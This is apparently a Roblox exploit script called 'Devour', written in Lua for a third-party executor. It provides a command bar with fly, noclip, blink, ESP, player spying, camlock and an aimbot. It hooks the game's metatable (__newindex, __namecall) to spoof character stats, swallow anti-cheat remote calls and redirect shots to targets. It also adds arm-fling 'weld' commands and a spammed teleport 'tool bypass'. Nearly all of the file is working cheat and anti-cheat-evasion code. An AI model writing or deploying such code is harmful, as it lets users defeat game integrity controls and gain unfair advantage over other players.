getgenv().RunCommand = function(Cmd)
    Cmd = string.lower(Cmd)
    pcall(function()
        if Cmd:sub(1, #Prefix) == Prefix then 
            local Args = string.split(Cmd:sub(#Prefix + 1), " ")
            local CmdName = GetInit(table.remove(Args, 1))
            if CmdName and Args then
                return CmdName(Args)
            end
        end
    end)
end
getgenv().SearchPlayers = function(Name)
    local Inserted = {}
        for _, p in pairs(game:GetService("Players"):GetPlayers()) do 
        if string.lower(string.sub(p.Name, 1, string.len(Name))) == string.lower(Name) then 
            table.insert(Inserted, p);return p
        end
    end
end

local ScreenGui = Instance.new("ScreenGui")
local Cmdbar = Instance.new("TextBox")
local CmdbarARC = Instance.new("TextLabel")
local Frame = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")

coroutine.resume(coroutine.create(function()
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

Cmdbar.Name = "Cmdbar"
Cmdbar.Parent = ScreenGui
Cmdbar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Cmdbar.BorderColor3 = Color3.fromRGB(255, 0, 0)
Cmdbar.BorderSizePixel = 3
Cmdbar.Position = UDim2.new(0.0209330097, 0, 0.587117374, 0)
Cmdbar.Size = UDim2.new(0, 260, 0, 32)
Cmdbar.SizeConstraint = Enum.SizeConstraint.RelativeYY
Cmdbar.Font = Enum.Font.Gotham
Cmdbar.PlaceholderColor3 = Color3.fromRGB(255, 0, 0)
Cmdbar.Text = ""
Cmdbar.TextColor3 = Color3.fromRGB(0, 0, 0)
Cmdbar.TextSize = 14.000
Cmdbar.TextWrapped = true
Cmdbar.TextXAlignment = Enum.TextXAlignment.Left
Cmdbar.Visible = false

CmdbarARC.Name = "CmdbarARC"
CmdbarARC.Parent = Cmdbar
CmdbarARC.BackgroundColor3 = Color3.fromRGB(255,0,0)
CmdbarARC.BorderSizePixel = 0
CmdbarARC.Position = UDim2.new(-0.123076916, 0, 0, 0)
CmdbarARC.Size = UDim2.new(0, 32, 0, 32)
CmdbarARC.Font = Enum.Font.Code
CmdbarARC.Text = ">"
CmdbarARC.TextColor3 = Color3.fromRGB(0,0,0)
CmdbarARC.TextSize = 19.000
CmdbarARC.TextWrapped = true

Frame.Parent = Cmdbar
Frame.BackgroundColor3 = Color3.fromRGB(255,0,0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(-0.123076923, 0, 0.972426474, 0)
Frame.Size = UDim2.new(0, 292, 0, 2)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255,0,0)), ColorSequenceKeypoint.new(0.52, Color3.fromRGB(255,255,255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255,0,0))}
UIGradient.Parent = Frame
end))

local Uis = game:GetService("UserInputService")
Uis.InputBegan:Connect(function(Key, Typing)
    if Typing then return end
    if Key.KeyCode == Enum.KeyCode.Semicolon then
        Cmdbar.Visible = true
        Cmdbar.Text = ""
        wait()
        Cmdbar:CaptureFocus()
        --Cmdbar:TweenSize(UDim2.new(0, 419, 0, 20), "Out", "Quad", 0.1, true)
    end
end)
Cmdbar.FocusLost:Connect(function(Foc)
    if Foc == true then
        Cmdbar.Visible = false
            RunCommand(Cmdbar.Text)
    end
end)
Uis.InputEnded:Connect(function(Key)
    if Key.KeyCode.Name == "LeftAlt" then
        Cmdbar.Visible = false
    end
end)

local executed = true

	local LoadingTime = tick();
local Commands, Prefix = {}, "!"
getgenv().Notify = function(title, text, icon, time)
    game:GetService("StarterGui"):SetCore("SendNotification",{
        Title = title;
        Text = text;
        Icon = "rbxassetid://2541869220";
        Duration = time;
    }) 
end

			getgenv().RunCommand = function(Cmd)
				Cmd = string.lower(Cmd)
				pcall(function()
					if Cmd:sub(1, #Prefix) == Prefix then 
						local Args = string.split(Cmd:sub(#Prefix + 1), " ")
						local CmdName = GetInit(table.remove(Args, 1))
						if CmdName and Args then
							return CmdName(Args)
						end
					end
				end)
			end
			


getgenv().GetInit = function(CName)
    for _, v in next, Commands do 
        if v.Name == CName or table.find(v.Aliases, CName) then 
            return v.Function 
        end 
    end
end

local Players, RService, RStorage, VUser, SGui, TPService = game:GetService("Players"), game:GetService("RunService"), game:GetService("ReplicatedStorage"), game:GetService("VirtualUser"), game:GetService("StarterGui"), game:GetService("TeleportService")
local Client, Mouse, Camera, CF, INew, Vec3, Vec2, UD2, UD = Players.LocalPlayer, Players.LocalPlayer:GetMouse(), workspace.CurrentCamera, CFrame.new, Instance.new, Vector3.new, Vector2.new, UDim2.new, UDim.new;
local Noclip, Blink, Esp, Flying, Noseats = false, false, false, false, false;
local Aimbot, Viewing, Camlock = false, false, false;
local AimbotTarget, ViewTarget, CamlockTarget, EspTarget = nil, nil, nil, nil;
local Flyspeed, Aimvelocity, Blinkspeed = 5, 10, 2;
local AimPart, CamPart = "Torso", "Torso";

-- [[ functions ]] -- 
local AimPartTable = {
    ["torso"] = "Torso";
    ["head"] = "Head";
}
local KeysTable = {
    ["W"] = false;["A"] = false;
    ["S"] = false;["D"] = false;
    ["LeftControl"] = false;["LeftShift"] = false;
}
local function ConfirmCallbacks()
    wait()
    SGui:SetCore("ResetButtonCallback", true)
end
ConfirmCallbacks()
getgenv().EspPlayer = function(Dude)
    local bgui = Instance.new("BillboardGui", Dude.Character.Head)
    local tlabel = Instance.new("TextLabel", bgui)
    
    bgui.Name = "ESP"
    bgui.Adornee = part
    bgui.AlwaysOnTop = true
    bgui.ExtentsOffset = Vector3.new(0, 3, 0)
    bgui.Size = UDim2.new(0, 5, 0, 5)
        
    tlabel.Name = "espTarget"
    tlabel.BackgroundColor3 = Color3.fromRGB(0,255,255)
    tlabel.BackgroundTransparency = 1
    tlabel.BorderSizePixel = 0
    tlabel.Position = UDim2.new(0, 0, 0, -30)
    tlabel.Size = UDim2.new(1, 0, 7, 0)
    tlabel.Visible = true
    tlabel.ZIndex = 10
    tlabel.Font = "ArialBold"
    tlabel.FontSize = "Size14"
    RService.RenderStepped:Connect(function()
        if Dude and Dude.Character and Dude.Character:FindFirstChildOfClass("Humanoid") then 
            tlabel.Text = Dude.Name.." ["..math.floor(Dude.Character.Humanoid.Health).."/"..math.floor(Dude.Character.Humanoid.MaxHealth).."]".." ["..math.floor(Dude:DistanceFromCharacter(Client.Character.Head.Position)).."]"
        end
    end)
    tlabel.TextColor = BrickColor.new("White") 
    tlabel.TextStrokeTransparency = 0.1
end

getgenv().togglefly = function()
    Flying = not Flying
    Notify("Devour", "Flying: "..tostring(Flying), "", 3)
    local T = Client.Character:FindFirstChild("HumanoidRootPart") or Client.Character:FindFirstChild("Torso")
    local BV, BG = INew("BodyVelocity", T), INew("BodyGyro", T)
    BV.Velocity = Vec3(0, 0.1, 0);BV.MaxForce = Vec3(math.huge, math.huge, math.huge)
    BG.CFrame = T.CFrame;BG.P = 9e9;BG.MaxTorque = Vec3(9e9, 9e9, 9e9)
    local FlyPart = INew("Part", workspace)
    FlyPart.Anchored = true;FlyPart.Size = Vec3(6, 1, 6);FlyPart.Transparency = 1 
    
    while Flying == true and Client and Client.Character and Client.Character:FindFirstChild("Humanoid") and Client.Character.Humanoid.Health ~= 0 and RService.Heartbeat:Wait() and T do 
        local Front, Back, Left, Right = 0, 0, 0, 0
        if KeysTable["W"] == true then 
            Front = Flyspeed 
        elseif not KeysTable["W"] == true then
            Front = 0 
        end
        if KeysTable["A"] == true then 
            Right = -Flyspeed
        elseif not KeysTable["A"] == true then 
            Right = 0 
        end
        if KeysTable["S"] == true then 
            Back = -Flyspeed 
        elseif not KeysTable["S"] == true then 
            Back = 0
        end
        if KeysTable["D"] == true then 
            Left = Flyspeed
        elseif not KeysTable["D"] == true then 
            Left = 0
        end
        if tonumber(Front + Back) ~= 0 or tonumber(Left + Right) ~= 0 then 
            BV.Velocity = ((Camera.CoordinateFrame.lookVector * (Front + Back)) + ((Camera.CoordinateFrame * CF(Left + Right, (Front + Back) * 0.2, 0).p) - Camera.CoordinateFrame.p)) * 50
        else 
            BV.Velocity = Vec3(0, 0.1, 0)
        end
        BG.CFrame = Camera.CoordinateFrame
    end
    FlyPart:Destroy();BG:Remove();BV:Remove()
end

Uis.InputBegan:Connect(function(Key)
    if not (Uis:GetFocusedTextBox()) then
        if Key.KeyCode == Enum.KeyCode.W then 
            KeysTable["W"] = true 
        end 
        if Key.KeyCode == Enum.KeyCode.A then 
            KeysTable["A"] = true 
        end
        if Key.KeyCode == Enum.KeyCode.S then 
            KeysTable["S"] = true 
        end
        if Key.KeyCode == Enum.KeyCode.D then 
            KeysTable["D"] = true 
        end
        if Key.KeyCode == Enum.KeyCode.F then 
            if FirstFly == true then 
                Notify("Devour", "Fly Like A 911 Pilot", "", 3)
                FirstFly = false 
            end
            togglefly()
        end
        if Key.KeyCode == Enum.KeyCode.X then 
            Noclip = not Noclip 
            Notify("Devour", "Noclip: "..tostring(Noclip), "", 3)
        end
        if Key.KeyCode == Enum.KeyCode.LeftShift then
            KeysTable["LeftShift"] = true
            while Blink == true and KeysTable["LeftShift"] == true and Client and Client.Character and RService.Heartbeat:Wait() do
                local ClientRF = Client.Character:FindFirstChild("HumanoidRootPart") or Client.Character:FindFirstChild("Torso")
                local Hum = Client.Character:FindFirstChild("Humanoid")
                ClientRF.CFrame = ClientRF.CFrame + Vec3(Hum.MoveDirection.X * Blinkspeed, Hum.MoveDirection.Y * Blinkspeed, Hum.MoveDirection.Z * Blinkspeed)
            end 
        end
    end
end)
Uis.InputEnded:Connect(function(Key --[[Typing]])
    if not (Uis:GetFocusedTextBox()) then
        if Key.KeyCode == Enum.KeyCode.W then 
            KeysTable["W"] = false 
        end
        if Key.KeyCode == Enum.KeyCode.A then 
            KeysTable["A"] = false 
        end
        if Key.KeyCode == Enum.KeyCode.S then 
            KeysTable["S"] = false 
        end
        if Key.KeyCode == Enum.KeyCode.D then 
            KeysTable["D"] = false
        end
        if Key.KeyCode == Enum.KeyCode.LeftShift then
            KeysTable["LeftShift"] = false
        end
    end
end)
--/commands
Commands["Sets your Flyspeed"] = {
    ["Aliases"] = {"flyspeed", "fs"};
    ["Function"] = function(Args)
        if Args[1] then 
            Flyspeed = tonumber(Args[1])
            Notify("Devour", "Flyspeed: "..tonumber(Flyspeed), "", 3)
        end
    end
}
Commands["Sets your Chat Command Prefix"] = {
    ["Aliases"] = {"prefix", "pfix"};
    ["Function"] = function(Args)
        if Args[1] then 
            Prefix = Args[1]
        end
        Notify("Devour", "Prefix: "..tostring(Prefix), "", 3)
    end
}
Commands["Toggles Fly"] = {
    ["Aliases"] = {"fly", "togglefly", "f"};
    ["Function"] = function(Args)
        togglefly()
    end
}
Commands["Sets your FieldOfView"] = {
    ["Aliases"] = {"fieldofview", "fov"};
    ["Function"] = function(Args)
        if Args[1] then 
            Camera.FieldOfView = tonumber(Args[1])
        end
        Notify("Devour", "FieldOfView: "..tonumber(Args[1]), "", 3)
    end
}
Commands["View a Player"] = {
    ["Aliases"] = {"view", "spy"};
    ["Function"] = function(Args)
        if Args[1] then 
            ViewTarget = SearchPlayers(Args[1]);Viewing = true 
        end
        Notify("Devour", "You Are Spying On: "..tostring(ViewTarget), "", 3)
    end
}
Commands["UnView Viewed Target"] = {
    ["Aliases"] = {"unview", "unspy"};
    ["Function"] = function()
        ViewTarget = nil;Viewing = false
        Camera.CameraSubject = Client.Character
        Notify("Devour", "You Stopped Spying: "..tostring(Viewing), "", 3)
    end
}
Commands["Toggles Blink"] = {
    ["Aliases"] = {"blink", "blinkspd"};
    ["Function"] = function(Args)
        Blink = not Blink 
        Notify("Devour", "Blink: "..tostring(Blink), "", 3)
    end
}
Commands["Esp a Player"] = {
    ["Aliases"] = {"esp", "find"};
    ["Function"] = function(Args)
        if Args[1] then
            EspTarget = SearchPlayers(Args[1])
            if EspTarget then
                EspPlayer(EspTarget)
            end
        end
        Notify("Devour", "Esp Target: "..tostring(EspTarget), "", 3)
    end
}
Commands["UnEsp Esp'd Player"] = {
    ["Aliases"] = {"unesp", "unfind"};
    ["Function"] = function(Args)
        if Args[1] then 
            local UnEspPlayer;UnEspPlayer = SearchPlayers(Args[1])
            if UnEspPlayer then 
                for _, v in next, UnEspPlayer.Character:GetDescendants() do 
                    if v:IsA("BillboardGui") or v:IsA("TextLabel") then 
                        v:Destroy() --[[if staircase(s) go brrrRRR]]
                    end
                end
            end
        end
    end
}
Commands["Sets Camlock Target"] = {
    ["Aliases"] = {"camlock", "cam", "cl", "cml"};
    ["Function"] = function(Args)
        if Args[1] then 
            CamlockTarget = SearchPlayers(Args[1]);Camlock = true
        end
        Notify("Devour", "Set Your Camlock Target: "..tostring(CamlockTarget), "", 3)
    end
}
Commands["UnCamlocks Camlocked Target"] = {
    ["Aliases"] = {"uncamlock", "uncam", "uncl", "uncml"};
    ["Function"] = function()
        CamlockTarget = nil;Camlock = false 
        Notify("Devour", "UnCamlock: "..tostring(Camlock), "", 3)
    end
}
Commands["Sets Aimbot Target"] = {
    ["Aliases"] = {"aim", "aimlock", "aimbot", "shoot"};
    ["Function"] = function(Args)
        if Args[1] then 
            AimbotTarget = SearchPlayers(Args[1]);Aimbot = true
        end
        Notify("Devour", "Aimbot Target: "..tostring(AimbotTarget), "", 3)
    end
}
Commands["UnAimbots Aimbotted Target"] = {
    ["Aliases"] = {"unaim", "uns", "unaimbot", "unshoot"};
    ["Function"] = function()
        AimbotTarget = nil;Aimbot = false
        Notify("Devour", "Stopped Aimbotting: "..tostring(Aimbot), "", 3)
    end
}
Commands["Sets Aimvelocity"] = {
    ["Aliases"] = {"aimvelocity", "av"};
    ["Function"] = function(Args)
        if Args[1] then 
            Aimvelocity = tonumber(Args[1])
        end
        Notify("Devour", "Changed Your Aimvelocity: "..tonumber(Args[1]), "", 3)
    end
}
Commands["Toggles Noclip"] = {
    ["Aliases"] = {"noclip", "nc", "nclip"};
    ["Function"] = function()
        Noclip = not Noclip 
        Notify("Devour", "Noclip: "..tostring(Noclip), "", 3)
    end
}
Commands["Sets Blinkspeed"] = {
    ["Aliases"] = {"bs", "blinkspeed"};
    ["Function"] = function(Args)
        if Args[1] then 
            Blinkspeed = tonumber(Args[1])
        end
        Notify("Devour", "Changed Your Blinkspeed To: "..tonumber(Args[1]), "", 3)
    end
}
Commands["Sets Aimbot Part"] = {
    ["Aliases"] = {"aimpart", "ap"};
    ["Function"] = function(Args)
        AimPart = Args[1]
        if AimPartTable[Args[1]] then 
            AimPart = AimPartTable[Args[1]] 
        end
        Notify("Devour", "Set Your AimPart To: "..tostring(AimPart), "", 3)
    end
}
RService.Stepped:Connect(function()
    if Camlock == true and CamlockTarget and CamlockTarget.Character and CamlockTarget.Character:FindFirstChild(CamPart) then 
        Camera.CoordinateFrame = CF(Camera.CoordinateFrame.p, CF(CamlockTarget.Character[CamPart].Position).p)
    end
    if Noclip == true then 
        for i = 1, #Client.Character:GetChildren() do
            local CG = Client.Character:GetChildren()[i]
            if CG:IsA("BasePart") then 
                CG.CanCollide = false 
            end
        end
        pcall(function()
            if Client and Client.Backpack then 
                Client.Backpack:FindFirstChild("Glock").Barrel.CanCollide = false 
            else
                Client.Character:FindFirstChild("Glock").Barrel.CanCollide = false
            end
        end)
    end
    if Viewing == true and ViewTarget ~= nil then 
        Camera.CameraSubject = ViewTarget.Character
    end
    if Flying and Client.Character then
        if Client.Character and Client.Character:FindFirstChild("Humanoid") then
            RService.Heartbeat:Wait()
            Client.Character.Humanoid.PlatformStand = false;Client.Character.Humanoid.Sit = false
            Client.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
        end
	end
    if Client.Character:FindFirstChild("FlyPart") then
        Client.Character:FindFirstChild("FlyPart").CFrame = Client.Character.HumanoidRootPart.CFrame * CF(0, -3.5, 0)
    end
end)
Client.Character.Humanoid.Died:Connect(function()
    if Flying then togglefly() end
end)
Client.CharacterAdded:Connect(function()
    repeat wait() until Client.Character:FindFirstChild("Humanoid")
    Client.Character.Humanoid.Died:Connect(function()
        if Flying then togglefly() end
    end)
end)

local rm = getrawmetatable(game) or debug.getrawmetatable(game) or getmetatable(game)
if setreadonly then setreadonly(rm, false) else make_writeable(rm, true) end
local caller, cscript = checkcaller or is_protosmasher_caller, getcallingscript or get_calling_script;
local rindex, nindex, ncall, closure = rm.__index, rm.__newindex, rm.__namecall, newcclosure or read_me;

rm.__newindex = closure(function(self, Meme, Val)
    if caller() then return nindex(self, Meme, Val) end 
    if game.PlaceId ~= (StreetsID) then 
        if Meme == "WalkSpeed" then 
            return 16
        end
        if Meme == "JumpPower" then 
            return 37.5 
        end
        if Meme == "SprintSpeed" then
            return 15
        end
        if Meme == "HipHeight" then 
            return 0 
        end
        if Meme == "Health" then 
            return 100 
        end
    end
    if self:IsDescendantOf(Client.Character) and self.Name == "HumanoidRootPart" or self.Name == "Torso" then 
        if Meme == "CFrame" or Meme == "Position" or Meme == "Anchored" then 
            return nil 
        end
    end
    return nindex(self, Meme, Val) 
end)
rm.__namecall = closure(function(self, ...)
    local Args, Method = {...}, getnamecallmethod() or get_namecall_method();
    if Method == "BreakJoints" then 
        return wait(9e9)
    end
    if game.PlaceId ~= (StreetsID) then
        if Method == "FireServer" and not self.Name == "SayMessageRequest" then
            if tostring(self.Parent) == "ReplicatedStorage" or self.Name == "lIII" then 
                return wait(9e9) 
            end
            if Args[1] == "hey" then 
                return wait(9e9) 
            end
        end
        if Method == "FireServer" and self.Name == "Fire" and AimbotTarget ~= nil and Aimbot == true  then
            return ncall(self, AimbotTarget.Character[AimPart].CFrame + AimbotTarget.Character[AimPart].Velocity/Aimvelocity)
        end
    end
    if game.PlaceId == (StreetsID) then
        if Method == "FireServer" and Args[1] == "WalkSpeed" or Args[1] == "JumpPower" or Args[1] == "HipHeight" then 
            return nil 
        end
        if Method == "FireServer" and self.Name == "Input" then 
            if Args[1] == "bv" or Args[1] == "hb" or Args[1] == "ws" then 
                return wait(9e9)
            end
        end
        if Method == "FireServer" and self.Name == "Input" and AimbotTarget ~= nil and Aimbot == true then 
            Args[2].mousehit = AimbotTarget.Character[AimPart].CFrame + AimbotTarget.Character[AimPart].Velocity/Aimvelocity 
            Args[2].velo = math.huge
            return ncall(self, unpack(Args))
        end
    end
    return ncall(self, unpack(Args))
end)
if setreadonly then setreadonly(rm, true) else make_writeable(rm, false) end


print([[

]])

	game:GetService("Workspace").FallenPartsDestroyHeight = math.huge-math.huge
	Notify("Devour", "Took "..string.format("%.3f", tick() - LoadingTime).." seconds to load", "" , 3)
	
	local RunService = game:GetService("RunService")
	
	RunService.RenderStepped:Connect(function()
		if game.Players.LocalPlayer.Character.Humanoid then
			--print("")
			if game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet") then
				print("")
				if game.Players.LocalPlayer.Character.Humanoid.Bullet:findFirstChild("Trail") then
					print("")
					if game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Name == "BulletDone" then
						print("")
					end
					if game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet"):findFirstChild("Trail").Lifetime < 0.21 then
						print("")
						game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Lifetime = 0.21
						game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Transparency = NumberSequence.new(0)
						game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Color = ColorSequence.new(Color3.fromRGB(255,255,255),Color3.fromRGB(255,0,0))
						game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Name = "BulletDone"
					end
				end
			end
		end
	end)


	game.StarterGui:SetCore("SendNotification", {
		Title = "Devour";
		Text = "I Got Bored";
		Icon = "";
		Duration = 4;
			})

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."weld1" or Cmd == Prefix.."w1" then
       local char = game.Players.LocalPlayer.Character
local torso = char.Torso

torso_att = Instance.new("Attachment", torso)

torso_att.Rotation = Vector3.new(0,0,0)
torso_att.Position = Vector3.new(0,0,0)

rarm = char["Right Arm"]
torso["Right Shoulder"]:Destroy()
rarm.RightShoulderAttachment:Destroy()

r = Instance.new("Attachment",rarm)
r.Rotation = Vector3.new(-100,0,0) 
r.Position = Vector3.new(-1.5,1.0,0.5)

t = Instance.new("Attachment",torso)

rap = Instance.new("AlignPosition",rarm)
rap.ApplyAtCenterOfMass = false
rap.MaxVelocity = 0/0
rap.ReactionForceEnabled = false
rap.Attachment0 = r
rap.Attachment1 = t
rap.RigidityEnabled = true;
rap.MaxForce = 0/0;
rap.RigidityEnabled = true;
rap.Responsiveness = 10000;
rarm.CanCollide = false

rao = Instance.new("AlignOrientation",rarm)
rao.MaxAngularVelocity = 0/0
rao.MaxTorque = 0/0
rao.PrimaryAxisOnly = false
rao.ReactionTorqueEnabled = false
rao.Attachment0 = r
rao.Attachment1 = t
rao.RigidityEnabled = true

game:GetService("RunService").Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(100,100,100)
end)

wait(2)
print(rarm.Velocity)
for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v.Name == "Right Arm" then 
game:GetService("RunService").RenderStepped:connect(function()
v.Velocity = Vector3.new(1e1,2e2,3e3)
end)
end
end
end
end)




local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."weld2" or Cmd == Prefix.."w2" then
        local char = game.Players.LocalPlayer.Character
local torso = char.Torso

torso_att = Instance.new("Attachment", torso)

torso_att.Rotation = Vector3.new(0,0,0)
torso_att.Position = Vector3.new(0,0,0)

rarm = char["Right Arm"]
torso["Right Shoulder"]:Destroy()
rarm.RightShoulderAttachment:Destroy()

r = Instance.new("Attachment",rarm)
r.Rotation = Vector3.new(-90,0,40)  
r.Position = Vector3.new(-1,0,1.2)

t = Instance.new("Attachment",torso)

rap = Instance.new("AlignPosition",rarm)
rap.ApplyAtCenterOfMass = false
rap.MaxVelocity = 0/0
rap.ReactionForceEnabled = false
rap.Attachment0 = r
rap.Attachment1 = t
rap.RigidityEnabled = true;
rap.MaxForce = 0/0;
rap.RigidityEnabled = true;
rap.Responsiveness = 10000;
rarm.CanCollide = false

rao = Instance.new("AlignOrientation",rarm)
rao.MaxAngularVelocity = 0/0
rao.MaxTorque = 0/0
rao.PrimaryAxisOnly = false
rao.ReactionTorqueEnabled = false
rao.Attachment0 = r
rao.Attachment1 = t
rao.RigidityEnabled = true

game:GetService("RunService").Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(100,100,100)
end)

wait(2)
print(rarm.Velocity)
for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v.Name == "Right Arm" then 
game:GetService("RunService").RenderStepped:connect(function()
v.Velocity = Vector3.new(1e1,2e2,3e3)
end)
end
end
    end
end)


local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."weld3" or Cmd == Prefix.."w3" then
        local char = game.Players.LocalPlayer.Character
local torso = char.Torso

torso_att = Instance.new("Attachment", torso)

torso_att.Rotation = Vector3.new(0,0,0)
torso_att.Position = Vector3.new(0,0,0)

rarm = char["Right Arm"]
torso["Right Shoulder"]:Destroy()
rarm.RightShoulderAttachment:Destroy()

r = Instance.new("Attachment",rarm)
r.Rotation = Vector3.new(-90,0,0) 
r.Position = Vector3.new(-1.5,0.5,0.5)

t = Instance.new("Attachment",torso)

rap = Instance.new("AlignPosition",rarm)
rap.ApplyAtCenterOfMass = false
rap.MaxVelocity = 0/0
rap.ReactionForceEnabled = false
rap.Attachment0 = r
rap.Attachment1 = t
rap.RigidityEnabled = true;
rap.MaxForce = 0/0;
rap.RigidityEnabled = true;
rap.Responsiveness = 10000;
rarm.CanCollide = false

rao = Instance.new("AlignOrientation",rarm)
rao.MaxAngularVelocity = 0/0
rao.MaxTorque = 0/0
rao.PrimaryAxisOnly = false
rao.ReactionTorqueEnabled = false
rao.Attachment0 = r
rao.Attachment1 = t
rao.RigidityEnabled = true

game:GetService("RunService").Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(100,100,100)
end)

wait(2)
print(rarm.Velocity)
for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v.Name == "Right Arm" then 
game:GetService("RunService").RenderStepped:connect(function()
v.Velocity = Vector3.new(1e1,2e2,3e3)
end)
end
end
    end
end)


local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."weld4" or Cmd == Prefix.."w4" then
        local char = game.Players.LocalPlayer.Character
local torso = char.Torso

torso_att = Instance.new("Attachment", torso)

torso_att.Rotation = Vector3.new(0,0,0)
torso_att.Position = Vector3.new(0,0,0)

rarm = char["Right Arm"]
torso["Right Shoulder"]:Destroy()
rarm.RightShoulderAttachment:Destroy()

r = Instance.new("Attachment",rarm)
r.Rotation = Vector3.new(-90,-39,0) 
r.Position = Vector3.new(-1,1.-0.8,0.4)

t = Instance.new("Attachment",torso)

rap = Instance.new("AlignPosition",rarm)
rap.ApplyAtCenterOfMass = false
rap.MaxVelocity = 0/0
rap.ReactionForceEnabled = false
rap.Attachment0 = r
rap.Attachment1 = t
rap.RigidityEnabled = true;
rap.MaxForce = 0/0;
rap.RigidityEnabled = true;
rap.Responsiveness = 10000;
rarm.CanCollide = false

rao = Instance.new("AlignOrientation",rarm)
rao.MaxAngularVelocity = 0/0
rao.MaxTorque = 0/0
rao.PrimaryAxisOnly = false
rao.ReactionTorqueEnabled = false
rao.Attachment0 = r
rao.Attachment1 = t
rao.RigidityEnabled = true

game:GetService("RunService").Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(100,100,100)
end)

wait(2)
print(rarm.Velocity)
for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v.Name == "Right Arm" then 
game:GetService("RunService").RenderStepped:connect(function()
v.Velocity = Vector3.new(1e1,2e2,3e3)
end)
end
end
    end
end)


local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."weld5" or Cmd == Prefix.."w5" then
        local char = game.Players.LocalPlayer.Character
local torso = char.Torso

torso_att = Instance.new("Attachment", torso)

torso_att.Rotation = Vector3.new(0,0,0)
torso_att.Position = Vector3.new(0,0,0)

rarm = char["Right Arm"]
torso["Right Shoulder"]:Destroy()
rarm.RightShoulderAttachment:Destroy()

r = Instance.new("Attachment",rarm)
r.Rotation = Vector3.new(-80,0,30) 
r.Position = Vector3.new(-1.5,0.4,0.6)

t = Instance.new("Attachment",torso)

rap = Instance.new("AlignPosition",rarm)
rap.ApplyAtCenterOfMass = false
rap.MaxVelocity = 0/0
rap.ReactionForceEnabled = false
rap.Attachment0 = r
rap.Attachment1 = t
rap.RigidityEnabled = true;
rap.MaxForce = 0/0;
rap.RigidityEnabled = true;
rap.Responsiveness = 10000;
rarm.CanCollide = false

rao = Instance.new("AlignOrientation",rarm)
rao.MaxAngularVelocity = 0/0
rao.MaxTorque = 0/0
rao.PrimaryAxisOnly = false
rao.ReactionTorqueEnabled = false
rao.Attachment0 = r
rao.Attachment1 = t
rao.RigidityEnabled = true

game:GetService("RunService").Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(100,100,100)
end)

wait(2)
print(rarm.Velocity)
for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v.Name == "Right Arm" then 
game:GetService("RunService").RenderStepped:connect(function()
v.Velocity = Vector3.new(1e1,2e2,3e3)
end)
end
end
    end
end)


local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."toolbypass?" or Cmd == Prefix.."tb" then
          game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
